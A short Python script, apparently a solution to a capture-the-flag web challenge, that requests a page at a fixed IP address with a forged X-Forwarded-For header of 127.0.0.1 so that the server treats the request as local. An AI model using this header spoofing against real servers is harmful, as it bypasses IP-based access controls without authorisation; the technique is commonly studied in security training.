import requests

url = "http://123.206.87.240:8002/localhost/"
headers = {'X-Forwarded-For': '127.0.0.1'}
r = requests.get(url, headers=headers)
print(r.text)